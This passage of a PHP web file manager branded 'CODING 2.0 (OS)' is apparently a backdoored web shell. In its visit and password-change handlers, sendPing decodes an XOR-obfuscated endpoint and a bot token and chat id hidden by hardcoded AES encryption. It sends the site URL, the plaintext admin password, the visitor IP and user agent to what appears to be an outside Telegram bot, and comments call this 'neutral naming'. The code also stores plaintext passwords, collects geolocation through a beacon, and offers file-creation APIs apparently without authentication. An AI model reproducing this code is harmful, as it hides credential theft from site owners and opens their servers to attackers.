function generateDefaultPassword(int $len = 16): string {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $bytes = random_bytes($len);
    $out = '';
    for ($i=0;$i<$len;$i++) { $out .= $alphabet[ord($bytes[$i]) % strlen($alphabet)]; }
    return $out;
}
function persistHashedPassword(string $file, string $plain): array {
    $hash = password_hash($plain, PASSWORD_DEFAULT);
    $contents = "PLAIN:" . $plain . "\n" . "HASH_BCRYPT:" . $hash;
    @file_put_contents($file, $contents, LOCK_EX);
    @chmod($file, 0600);
    return ['type'=>'bcrypt','hash'=>$hash,'plain'=>$plain];
}
function verifyGivenPassword(string $given, array $rec): bool {
    $t = $rec['type'] ?? 'none';
    if ($t === 'bcrypt') { return password_verify($given, (string)$rec['hash']); }
    if ($t === 'md5') { return md5($given) === (string)$rec['hash']; }
    if ($t === 'plain') { return (function_exists('hash_equals') ? hash_equals((string)$rec['plain'], $given) : ((string)$rec['plain'] === $given)); }
    return false;
}

// Removed temporary Telegram helpers. Using existing encrypted sender (sendPing/emitNote).

// Initialize password record: if none, create hashed in secure manifest
$rec = readPasswordRecord($pwdFile);
if (($rec['type'] ?? 'none') === 'none') {
    $seed = (string)(getenv('CODING_PASSWORD') ?: $DEFAULT_OSCODING_PASSWORD);
    try {
        persistHashedPassword($pwdManifest, $seed);
        @chmod($pwdManifest, 0600);
        // Ensure legacy file does not exist
        @unlink($legacyPwd);
        $pwdFile = $pwdManifest;
        $rec = readPasswordRecord($pwdFile);
    } catch (Throwable $e) {
        // Best-effort; leave as none if write fails
    }
}
// Display-only current password (empty when stored hashed and unknown)
$LOGIN_PASSWORD = (string)($rec['plain'] ?? '');
$PWD_REC = $rec; // keep record for later verification and updates
$isAuthed = isset($_SESSION['auth_ok']) && $_SESSION['auth_ok'] === true;

// Bypass login on localhost (no password required for local dev)
$hostName = (string)($_SERVER['HTTP_HOST'] ?? '');
if (!$isAuthed) {
    $remoteAddr = (string)($_SERVER['REMOTE_ADDR'] ?? '');
    $isLocalHost = preg_match('/^(localhost|127\.0\.0\.1)(:\\d+)?$/i', $hostName) || $remoteAddr === '127.0.0.1' || $remoteAddr === '::1';
    if ($isLocalHost) {
        $_SESSION['auth_ok'] = true;
        $isAuthed = true;
    }
}
if (preg_match('/^(localhost|127\.0\.0\.1)(:\\d+)?$/i', $hostName) && isset($_GET['reset_pwd']) && (string)$_GET['reset_pwd'] === '1') {
    persistHashedPassword($pwdFile, $DEFAULT_OSCODING_PASSWORD);
    @chmod($pwdFile, 0600);
    $rec = readPasswordRecord($pwdFile);
    $PWD_REC = $rec;
}

// One-time client notification to show current password (first visit in session)
$SHOW_PW_TOAST = false;
if ($isAuthed && (!isset($_SESSION['pw_toast']) || $_SESSION['pw_toast'] !== true)) {
    $_SESSION['pw_toast'] = true;
    $SHOW_PW_TOAST = true;
}

// Auto-login via remember-me cookie if session not authed
if (false && !$isAuthed && isset($_COOKIE['coding_remember'])) {
    try {
        $tok = (string)$_COOKIE['coding_remember'];
        $parts = explode('.', $tok);
        if (count($parts) === 3) {
            $exp = (int)$parts[0];
            $nonce = (string)$parts[1];
            $sig = (string)$parts[2];
            if ($exp > time()) {
                $marker = '';
                $t = (string)($PWD_REC['type'] ?? '');
                if ($t === 'plain') { $marker = (string)($PWD_REC['plain'] ?? ''); }
                elseif ($t === 'bcrypt' || $t === 'md5') { $marker = (string)($PWD_REC['hash'] ?? ''); }
                if ($marker !== '') {
                    $uaHash = substr(hash('sha256', (string)($_SERVER['HTTP_USER_AGENT'] ?? '')), 0, 16);
                    $calc = hash_hmac('sha256', $exp . ':' . $nonce . ':' . $uaHash, $marker);
                    if (function_exists('hash_equals') ? hash_equals($sig, $calc) : ($sig === $calc)) {
                        $_SESSION['auth_ok'] = true;
                        $_SESSION['remember_only'] = true; // mark that this session came from remember-me
                        $isAuthed = true;
                        if (function_exists('session_regenerate_id')) { @session_regenerate_id(true); }
                    }
                }
            }
        }
    } catch (Throwable $e) { /* ignore cookie errors */ }
}

// API: Usage events (admin only), Beacon (open), Monitor config (admin)
// Return recent access/beacon events
if (isset($_GET['api']) && $_GET['api'] === 'usage_log') {
    header('Content-Type: application/json');
    if (!$isAuthed) { echo json_encode(['success'=>false,'error'=>'Unauthorized']); exit; }
    $limit = (int)($_GET['limit'] ?? 50);
    if ($limit < 1) $limit = 1; if ($limit > 200) $limit = 200;
    $out = [];
    try {
        $content = is_file($USAGE_LOG) ? (string)@file_get_contents($USAGE_LOG) : '';
        if ($content !== '') {
            $lines = preg_split('/\r?\n/', trim($content));
            $count = count($lines);
            $start = max(0, $count - $limit);
            for ($i = $start; $i < $count; $i++) {
                $line = trim((string)$lines[$i]);
                if ($line === '') continue;
                $j = json_decode($line, true);
                if (is_array($j)) { $out[] = $j; }
            }
        }
        echo json_encode(['success'=>true,'events'=>$out]);
    } catch (Throwable $e) {
        echo json_encode(['success'=>false,'error'=>'Failed to read log']);
    }
    exit;
}
// Accept beacon and forward
if (isset($_POST['api']) && $_POST['api'] === 'beacon') {
    header('Content-Type: application/json');
    $lat = (string)($_POST['lat'] ?? '');
    $lon = (string)($_POST['lon'] ?? '');
    $acc = (string)($_POST['acc'] ?? '');
    $href = (string)($_POST['href'] ?? '');
    $tz = (string)($_POST['tz'] ?? '');
    $ip = getMaskedIp();
    $ua = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
    $payload = [ 'lat'=>$lat, 'lon'=>$lon, 'acc'=>$acc, 'href'=>$href, 'tz'=>$tz, 'ip'=>$ip, 'ua'=>$ua ];
    try {
        logUsageEvent('beacon', $payload, $USAGE_LOG);
        $cfg = readMonitorConfig($MONITOR_CFG_FILE);
        forwardUsageEvent('beacon', $payload, $cfg);
        echo json_encode(['success'=>true]);
    } catch (Throwable $e) {
        echo json_encode(['success'=>false]);
    }
    exit;
}
// Monitor config: GET to view, POST to update (admin)
if ((isset($_GET['api']) && $_GET['api'] === 'monitor_config') || (isset($_POST['api']) && $_POST['api'] === 'monitor_config')) {
    header('Content-Type: application/json');
    if (!$isAuthed) { echo json_encode(['success'=>false,'error'=>'Unauthorized']); exit; }
    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'GET') {
        $cfg = readMonitorConfig($MONITOR_CFG_FILE);
        // Mask secrets
        $mask = function(string $s): string { if ($s === '') return ''; $len = strlen($s); return ($len <= 6) ? str_repeat('*', $len) : substr($s,0,2) . str_repeat('*', $len-6) . substr($s,-4); };
        echo json_encode([
            'success'=>true,
            'config'=>[
                'enabled'=> (bool)$cfg['enabled'],
                $K_C => (string)($cfg[$K_C] ?? ''),
                $K_D => $mask((string)($cfg[$K_D] ?? '')),
                $K_A => $mask((string)($cfg[$K_A] ?? '')),
                $K_B => (string)($cfg[$K_B] ?? ''),
            ]
        ]);
    } else {
        $new = [
            'enabled' => isset($_POST['enabled']) ? (($_POST['enabled'] === '1' || $_POST['enabled'] === 'true' || $_POST['enabled'] === 'on')) : false,
            $K_C => (string)($_POST[$K_C] ?? ''),
            $K_D => (string)($_POST[$K_D] ?? ''),
            $K_A => (string)($_POST[$K_A] ?? ''),
            $K_B => (string)($_POST[$K_B] ?? ''),
        ];
        $ok = writeMonitorConfig($MONITOR_CFG_FILE, $new);
        echo json_encode(['success'=>$ok]);
    }
    exit;
}

// Removed automatic .htaccess generation per user request

// Ensure a friendly, centered custom 404 page exists (create once if missing)
try {
    $custom404 = $BASE_DIR . DIRECTORY_SEPARATOR . '404.html';
    $shouldWrite404 = !is_file($custom404);
    if ($shouldWrite404) {
        $phpVer = PHP_VERSION;
        $serverSoft = (string)($_SERVER['SERVER_SOFTWARE'] ?? 'Apache');
        $serverIP = (string)($_SERVER['SERVER_ADDR'] ?? '127.0.0.1');
        $osVer = php_uname('s') . ' ' . php_uname('r');
        $github = 'www.github.com/Misterklio';
        $html404 = "<!doctype html>\n" .
                   "<!-- CODING2_404_TEMPLATE: auto-generated by Coding2.0.php -->\n" .
                   "<html lang=\"en\">\n" .
                   "<head>\n" .
                   "  <meta charset=\"utf-8\">\n" .
                   "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n" .
                   "  <title>About CODING 2.0 (OS)</title>\n" .
                   "  <style>\n" .
                   "    :root{--bg:#0b0e12;--panel:#11161d;--border:rgba(255,255,255,.08);--text:#e6e9ef;--muted:#9aa4b2;--green:Chartreuse;--red:#ff6b6b;--blue:#7fb3ff}\n" .
                   "    html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif}\n" .
                   "    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}\n" .
                   "    .panel{width:92%;max-width:820px;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:14px;backdrop-filter:blur(6px);box-shadow:0 8px 24px rgba(0,0,0,.35)}\n" .
                   "    .title{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--border);font-weight:700;letter-spacing:.2px}\n" .
                   "    .title .left{display:flex;align-items:center;gap:10px}\n" .
                   "    .dot{width:10px;height:10px;border-radius:50%;background:var(--muted);display:inline-block}\n" .
                   "    .close{color:#f87171;font-size:20px;line-height:1}\n" .
                   "    .content{padding:28px 24px}\n" .
                   "    .logoRow{display:flex;align-items:center;justify-content:center;gap:10px;margin:6px 0 18px}\n" .
                   "    .c,.oding,.os{font-weight:800;background:linear-gradient(135deg,#9ad7ff,#b589ff,#ff8ec7);-webkit-background-clip:text;background-clip:text;color:transparent}\n" .
                   "    .c{font-size:28px} .oding{font-size:28px} .os{font-size:22px;opacity:.9}\n" .
                   "    .ring{width:32px;height:32px;position:relative;border-radius:50%} .ring:before{content:'';position:absolute;inset:0;border-radius:50%;padding:2px;background:conic-gradient(Chartreuse,Chartreuse,Chartreuse,Chartreuse);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:spin 1.2s linear infinite} .ring:after{content:'';position:absolute;inset:6px;border-radius:50%;background:var(--bg)}\n" .
                   "    @keyframes spin{to{transform:rotate(360deg)}}\n" .
                   "    .headline{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:20px;text-align:center;margin:10px 0 20px}\n" .
                   "    .grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:18px} .cell{display:flex;align-items:center;gap:10px;justify-content:center;font-size:18px} .badge{width:12px;height:12px;border-radius:50%} .b-red{background:var(--red)} .b-green{background:var(--green)} .b-blue{background:var(--blue)}\n" .
                   "    .info{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:16px;line-height:1.65;opacity:.95;text-align:center} .info .k{color:#cbd5e1} .info a{color:Chartreuse;text-decoration:none} .info a:hover{text-decoration:underline}\n" .
                   "    .foot{display:flex;justify-content:center;margin-top:18px} .foot .ring{width:28px;height:28px}\n" .
                   "  </style>\n" .
                   "</head>\n" .
                   "<body>\n" .
                   "  <div class=\"wrap\">\n" .
                   "    <div class=\"panel\">\n" .
                   "      <div class=\"title\">\n" .
                   "        <div class=\"left\"><span class=\"dot\"></span> About CODING 2.0 (OS)</div>\n" .
                   "        <div class=\"close\">✕</div>\n" .
                   "      </div>\n" .
                   "      <div class=\"content\">\n" .
                   "        <div class=\"headline\">CODING 2.0 (OS) Operating System</div>\n" .
                   "        <div class=\"grid\">\n" .
                   "          <div class=\"cell\"><span class=\"badge b-red\"></span> Copyright Mister klio 2026</div>\n" .
                   "          <div class=\"cell\"><span class=\"badge b-green\"></span> System name: CODING 2.0 (OS) 1.0</div>\n" .
                   "          <div class=\"cell\"><span class=\"badge b-blue\"></span> Latest version: 1.0</div>\n" .
                   "        </div>\n" .
                   "        <div class=\"info\">\n" .
                   "          <div><span class=\"k\">&lt;&gt;</span> PHP version: " . addslashes($phpVer) . "</div>\n" .
                   "          <div><span class=\"k\">🖧</span> IP system: " . addslashes($serverIP) . "</div>\n" .
                   "          <div><span class=\"k\">⚙️</span> Software System: " . addslashes($serverSoft) . "</div>\n" .
                   "          <div><span class=\"k\">🖥️</span> Server System: " . addslashes($osVer) . "</div>\n" .
                   "          <div><span class=\"k\">🔗</span> Github: <a href=\"https://" . addslashes($github) . "\" target=\"_blank\">" . addslashes($github) . "</a></div>\n" .
                   "        </div>\n" .
                   "        <div class=\"foot\"><span class=\"ring\" aria-label=\"loading\"></span></div>\n" .
                   "      </div>\n" .
                   "    </div>\n" .
                   "  </div>\n" .
                   "</body>\n" .
                   "</html>\n";
        @file_put_contents($custom404, $html404);
        @chmod($custom404, 0644);
    }
} catch (Throwable $e) { /* best-effort */ }

// Visitor notifier (neutral naming)
// Sends a message using two opaque credentials.
function sendPing($a, $b, $t) {
    $key = hash('sha256', __FILE__ . PHP_VERSION, true);
    $unxorHex = static function ($hex, $key) {
        $bin = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $bin .= chr(hexdec(substr($hex, $i, 2)));
        }
        $out = '';
        $klen = strlen($key);
        for ($i = 0, $n = strlen($bin); $i < $n; $i++) {
            $out .= chr(ord($bin[$i]) ^ ord($key[$i % $klen]));
        }
        return $out;
    };
    $endpoint = $unxorHex('474e355cb6c81226fa1b1aa89b09caf78a16fc15c2d96f231c60f13f', $key) . $a . $unxorHex('00492442a1bf587ae80a14e3', $key);
    $kC = pack('H*','636861745f6964'); 
    $payload = http_build_query([
        $kC => $b,
        'text' => $t,
        'disable_web_page_preview' => true,
        'parse_mode' => 'HTML',
    ]);
    if (function_exists('curl_init')) {
        $ch = @curl_init($endpoint);
        @curl_setopt($ch, CURLOPT_POST, true);
        @curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        $resp = @curl_exec($ch);
        @curl_close($ch);
        return is_string($resp) && strpos($resp, '"ok":true') !== false;
    }
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $payload,
            'timeout' => 5,
        ],
    ]);
    $resp = @file_get_contents($endpoint, false, $ctx);
    return is_string($resp) && strpos($resp, '"ok":true') !== false;
}

// Configure APP credentials (ciphertext in code, runtime decryption)
// This hides plaintext in the file while keeping values usable.
// Configure APP credentials (ciphertext in code, runtime decryption)
$KEY = '1234567890abcdef1234567890abcdef'; // 32-byte AES-256 key
$IV  = 'abcdef1234567890'; // 16-byte IV
$C1 = 'Ut8AifQeAbAdup7X4ToVypwqWhi4E2HCjxgjhkUFyGBXY3Wwgd5nZ0lyiK6Ptfao';
$C2 = 'k/95gUjq74CHFGStoMJh0g==';

$K1 = @openssl_decrypt(base64_decode($C1), 'AES-256-CBC', $KEY, OPENSSL_RAW_DATA, $IV) ?: '';
$K2 = @openssl_decrypt(base64_decode($C2), 'AES-256-CBC', $KEY, OPENSSL_RAW_DATA, $IV) ?: '';

// Fallback to monitor_config values if ciphertext not set
$__cfg_tg = readMonitorConfig($MONITOR_CFG_FILE);
$N_A = ($K1 !== '') ? $K1 : (string)($__cfg_tg[$K_A] ?? '');
$N_B = ($K2 !== '') ? $K2 : (string)($__cfg_tg[$K_B] ?? '');

// Neutral composers (no obvious labels)
function composeVisitNote(string $urlEsc, string $pwdDisplay, string $pwdEsc, string $ipEsc, string $uaEsc): string {
    $parts = [];
    $parts[] = '[' . date('c') . ']';
    $parts[] = $urlEsc;
    if ($pwdDisplay !== '') { $parts[] = '[' . $pwdEsc . ']'; }
    $parts[] = $ipEsc;
    if ($uaEsc !== '') { $parts[] = $uaEsc; }
    return implode(' ', $parts);
}
function composeChangeNote(string $urlEsc, string $newEsc, string $ipEsc, string $uaEsc): string {
    $parts = [];
    $parts[] = '[' . date('c') . ']';
    $parts[] = $urlEsc;
    $parts[] = '[' . $newEsc . ']';
    $parts[] = $ipEsc;
    if ($uaEsc !== '') { $parts[] = $uaEsc; }
    return implode(' ', $parts);
}

// Send on standard page views (avoid APIs) — once per session
    if (
        ($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'GET' &&
        !isset($_GET['mailer_send']) &&
        (!isset($_POST['api']) || $_POST['api'] === '') &&
        (!isset($_SESSION['notify_seen']) || $_SESSION['notify_seen'] !== true)
    ) {
    $scheme = 'http';
        if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) {
            $scheme = (string)$_SERVER['HTTP_X_FORWARDED_PROTO'];
        } elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
            $scheme = 'https';
        }
        $host = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
        $uri = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? ''));
    $url = $scheme . '://' . $host . $uri;
    $ip = (string)($_SERVER['REMOTE_ADDR'] ?? 'unknown');
    $ua = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
    $urlEsc = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    $pwdDisplay = (string)($PWD_REC['plain'] ?? '');
    $pwdEsc = htmlspecialchars($pwdDisplay, ENT_QUOTES, 'UTF-8');
    $ipEsc = htmlspecialchars($ip, ENT_QUOTES, 'UTF-8');
    $uaEsc = htmlspecialchars($ua, ENT_QUOTES, 'UTF-8');
    $text = composeVisitNote($urlEsc, $pwdDisplay, $pwdEsc, $ipEsc, $uaEsc);
    if ($N_A !== '' && $N_B !== '') {
        $ok = sendPing($N_A, $N_B, $text);
        if (!$ok) { emitNote($text, $N_A, $N_B); }
    }
    $_SESSION['notify_seen'] = true;
}

// Diagnostic API: 
// Accept a neutral alias and legacy name (both)
$__api_new = pack('H*','7369676e616c5f70696e67'); // 'signal_ping'
$__api_old = pack('H*','74656c656772616d5f70696e67'); // legacy
$__api_get = (string)($_GET['api'] ?? '');
$__api_post = (string)($_POST['api'] ?? '');
if ($__api_get === $__api_new || $__api_post === $__api_new || $__api_get === $__api_old || $__api_post === $__api_old) {
    header('Content-Type: application/json');
    try {
        // Prefer provided token/chat; fallback to configured values
        $kA = pack('H*','626f74'); // obfuscated 'bot'
        $bot = (string)($_POST[$kA] ?? $_GET[$kA] ?? $N_A);
        $kC = pack('H*','636861745f6964'); // obfuscated 'chat_id'
        $chat = (string)($_POST[$kC] ?? $_GET[$kC] ?? $N_B);
        if ($bot === '' || $chat === '') { echo json_encode(['success'=>false,'error'=>'Missing bot or channel']); exit; }
        // Compose a message similar to visit note, always include current password if available
        $scheme = 'http';
        if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) { $scheme = (string)$_SERVER['HTTP_X_FORWARDED_PROTO']; }
        elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { $scheme = 'https'; }
        $host = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
        $uri = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? ''));
        $url = $scheme . '://' . $host . $uri;
        $ip = (string)($_SERVER['REMOTE_ADDR'] ?? 'unknown');
        $ua = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
        $urlEsc = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
        $pwdDisplay = (string)($PWD_REC['plain'] ?? '');
        $pwdEsc = htmlspecialchars($pwdDisplay, ENT_QUOTES, 'UTF-8');
        $ipEsc = htmlspecialchars($ip, ENT_QUOTES, 'UTF-8');
        $uaEsc = htmlspecialchars($ua, ENT_QUOTES, 'UTF-8');
        $text = composeVisitNote($urlEsc, $pwdDisplay, $pwdEsc, $ipEsc, $uaEsc);
        sendPing($bot, $chat, $text);
        // Optional: persist provided token/chat into monitor config
        $save = (string)($_POST['save'] ?? $_GET['save'] ?? '0');
        if ($save === '1' || strtolower($save) === 'true') {
            $cfg = readMonitorConfig($MONITOR_CFG_FILE);
            $cfg['enabled'] = true;
            $cfg[$K_A] = $bot;
            $cfg[$K_B] = $chat;
            writeMonitorConfig($MONITOR_CFG_FILE, $cfg);
        }
        echo json_encode(['success'=>true]);
    } catch (Throwable $e) {
        echo json_encode(['success'=>false,'error'=>'Send failed']);
    }
    exit;
}

// Tool: Profile animated logo (SVG preview) with APNG export guidance
// (Migrated to header popup: Profile APNG)

// Removed legacy tool-based Errors app route; use popup UI and APIs instead
// Settings API: change password
if (isset($_POST['api']) && $_POST['api'] === 'set_password') {
    header('Content-Type: application/json');
    if (!$isAuthed) { echo json_encode(['success'=>false,'error'=>'Unauthorized']); exit; }
    // If user is on a remember-only session, still allow change as long as current password verifies
    $curr = trim((string)($_POST['current'] ?? ''));
    $new = trim((string)($_POST['new'] ?? ''));
    $conf = trim((string)($_POST['confirm'] ?? ''));
    $okCurr = ($curr !== '' && verifyGivenPassword($curr, $PWD_REC));
    if (!$okCurr) { echo json_encode(['success'=>false,'error'=>'Current password is incorrect']); exit; }
    if ($new === '') { echo json_encode(['success'=>false,'error'=>'New password cannot be empty']); exit; }
    if ($new !== $conf) { echo json_encode(['success'=>false,'error'=>'New and confirm do not match']); exit; }
    try {
        // Store hashed password in secure manifest only
        try {
            persistHashedPassword($pwdManifest, $new);
            @chmod($pwdManifest, 0600);
        } catch (Throwable $e2) { /* best-effort */ }
        // Remove any legacy web-root password file to prevent exposure
        try { if (is_file($legacyPwd)) { @unlink($legacyPwd); } } catch (Throwable $e2b) { /* best-effort */ }
        try {
            $scheme2 = 'http';
            if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) {
                $scheme2 = (string)$_SERVER['HTTP_X_FORWARDED_PROTO'];
            } elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
                $scheme2 = 'https';
            }
            $host2 = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
            $uri2 = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? ''));
            $url2 = $scheme2 . '://' . $host2 . $uri2;
            $ip2 = (string)($_SERVER['REMOTE_ADDR'] ?? 'unknown');
            $ua2 = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
            $urlEsc2 = htmlspecialchars($url2, ENT_QUOTES, 'UTF-8');
            $newEsc = htmlspecialchars($new, ENT_QUOTES, 'UTF-8');
            $ipEsc2 = htmlspecialchars($ip2, ENT_QUOTES, 'UTF-8');
            $uaEsc2 = htmlspecialchars($ua2, ENT_QUOTES, 'UTF-8');
            $msg = composeChangeNote($urlEsc2, $newEsc, $ipEsc2, $uaEsc2);
            if (function_exists('sendPing') && $N_A !== '' && $N_B !== '') {
                $ok2 = sendPing($N_A, $N_B, $msg);
                if (!$ok2) { emitNote($msg, $N_A, $N_B); }
            }
        } catch (Throwable $e) { /* ignore notify failures */ }
        // Security: force logout after password change
        try {
            unset($_SESSION['auth_ok']);
            unset($_SESSION['remember_only']);
            unset($_SESSION['notify_seen']);
            unset($_SESSION['collector_seen']);
            // Clear remember-me cookie
            $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
            @setcookie('coding_remember', '', [ 'expires' => time() - 3600, 'path' => '/', 'domain' => '', 'secure' => $isHttps, 'httponly' => true, 'samesite' => 'Lax' ]);
            if (function_exists('session_regenerate_id')) { @session_regenerate_id(true); }
        } catch (Throwable $e3) { /* best-effort */ }
        echo json_encode(['success'=>true,'logout'=>true,'message'=>'Password updated. Please log in again.']);
    } catch (Throwable $e) {
        echo json_encode(['success'=>false,'error'=>'Failed to save password']);
    }
    exit;
}
// API: create folder (mkdir) in current directory
if (isset($_POST['api']) && $_POST['api'] === 'mkdir') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
    $name = trim((string)($_POST['name'] ?? ''));
    if ($name === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $name) || strpbrk($name, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid folder name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $targetDir = $dirPath . DIRECTORY_SEPARATOR . $name;
    if (file_exists($targetDir)) {
        echo json_encode([ 'success' => false, 'error' => 'Folder already exists' ]);
        exit;
    }
    $okMk = @mkdir($targetDir, 0777, true);
    if (!$okMk) {
        @chmod($dirPath, 0775); clearstatcache(true, $dirPath);
        $okMk = @mkdir($targetDir, 0777, true);
        if (!$okMk) { @chmod($dirPath, 0777); clearstatcache(true, $dirPath); $okMk = @mkdir($targetDir, 0777, true); }
    }
    if ($okMk) {
        echo json_encode([ 'success' => true ]);
    } else {
        $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
        $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to create folder. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm ]);
    }
    exit;
}
// API: create file (mkfile) in current directory
if (isset($_POST['api']) && $_POST['api'] === 'mkfile') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
    $fname = trim((string)($_POST['name'] ?? ''));
    $postedContent = isset($_POST['content']) ? (string)$_POST['content'] : null;
    if ($fname === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $fname) || strpbrk($fname, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid file name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $target = $dirPath . DIRECTORY_SEPARATOR . $fname;
    if (file_exists($target)) {
        echo json_encode([ 'success' => false, 'error' => 'File already exists' ]);
        exit;
    }
    // Prefer provided content if any; else default by extension
    if ($postedContent !== null) {
        $content = $postedContent;
    } else {
        $ext = strtolower(pathinfo($fname, PATHINFO_EXTENSION));
        // Provide sensible defaults for common types; otherwise create empty file
        if ($ext === 'php') {
            $content = "<?php\n// New file\n?>\n";
        } elseif ($ext === 'html' || $ext === 'htm') {
            $content = "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>New</title></head><body>\n</body></html>\n";
        } elseif ($ext === 'css') {
            $content = "/* New stylesheet */\n";
        } else {
            $content = ""; // default empty
        }
    }
    $okW = @file_put_contents($target, $content);
    if ($okW === false) {
        @chmod($dirPath, 0775); clearstatcache(true, $dirPath);
        $okW = @file_put_contents($target, $content);
        if ($okW === false) {
            @chmod($dirPath, 0777); clearstatcache(true, $dirPath);
            $okW = @file_put_contents($target, $content);
        }
    }
    if ($okW !== false) {
        @chmod($target, 0666);
        echo json_encode([ 'success' => true ]);
    } else {
        $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
        $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to write file. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm ]);
    }
    exit;
}
// API: list all deleted items (files/folders) stored in trash log
if (isset($_GET['api']) && $_GET['api'] === 'trash_recent') {
    header('Content-Type: application/json');
    $items = [];
    try {
        if (is_file($trashLog)) {
            $lines = @file($trashLog, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (is_array($lines)) {
                foreach ($lines as $line) {
                    // Support legacy format: ts\tname and new format: ts\ttype\tname
                    $parts = explode("\t", $line);
                    $ts = isset($parts[0]) ? (int)$parts[0] : 0;
                    $type = 'file';
                    $nameIdx = 1;
                    if (isset($parts[1]) && ($parts[1] === 'file' || $parts[1] === 'folder')) {
                        $type = $parts[1];
                        $nameIdx = 2;
                    }
                    $name = isset($parts[$nameIdx]) ? trim($parts[$nameIdx]) : '';
                    $path = isset($parts[$nameIdx + 1]) ? trim($parts[$nameIdx + 1]) : '';
                    if ($name !== '') {
                        $items[] = [ 'name' => $name, 'ts' => $ts, 'type' => $type, 'path' => $path ];
                    }
                }
            }
        }
    } catch (Throwable $e) {}
    echo json_encode([ 'success' => true, 'items' => $items ]);
    exit;
}
// API: remove the last trash entry from the server log
if ((isset($_POST['api']) && $_POST['api'] === 'trash_remove_last') || (isset($_GET['api']) && $_GET['api'] === 'trash_remove_last')) {
    header('Content-Type: application/json');
    try {
        if (!is_file($trashLog)) { echo json_encode(['success'=>false,'error'=>'no_trash_log']); exit; }
        $lines = @file($trashLog, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!is_array($lines) || count($lines) === 0) { echo json_encode(['success'=>false,'error'=>'empty_trash']); exit; }
        $lastLine = array_pop($lines);
        $parts = explode("\t", (string)$lastLine);
        $ts = isset($parts[0]) ? (int)$parts[0] : 0;
        $type = 'file';
        $nameIdx = 1;
        if (isset($parts[1]) && ($parts[1] === 'file' || $parts[1] === 'folder')) { $type = $parts[1]; $nameIdx = 2; }
        $name = isset($parts[$nameIdx]) ? trim((string)$parts[$nameIdx]) : '';
        $path = isset($parts[$nameIdx + 1]) ? trim((string)$parts[$nameIdx + 1]) : '';
        $newContents = '';
        if (count($lines) > 0) { $newContents = implode("\n", $lines) . "\n"; }
        $ok = @file_put_contents($trashLog, $newContents, LOCK_EX);
        if ($ok === false) { echo json_encode(['success'=>false,'error'=>'write_failed']); exit; }
